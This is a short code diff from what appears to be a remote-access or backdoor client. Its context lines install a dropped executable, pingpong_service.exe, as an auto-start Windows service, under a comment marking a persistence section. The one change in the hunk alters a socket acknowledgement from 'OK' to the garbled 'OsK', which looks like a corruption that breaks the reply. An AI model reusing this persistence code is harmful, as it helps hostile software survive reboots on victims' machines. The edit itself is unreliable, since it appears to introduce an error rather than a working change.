@@ -324,7 +324,7 @@ def PINGPONG_client_T(ip, port):
                     Popen(f"{tmp_dir}\\{dir}\\pingpong_service.exe --startup=auto install", shell=True)
                     Popen(f"{tmp_dir}\\{dir}\\pingpong_service.exe start", shell=True)
                 start(dir_name)
-                s.send(b'OK')
+                s.send(b'OsK')
 
                 
 #persistence_END_location
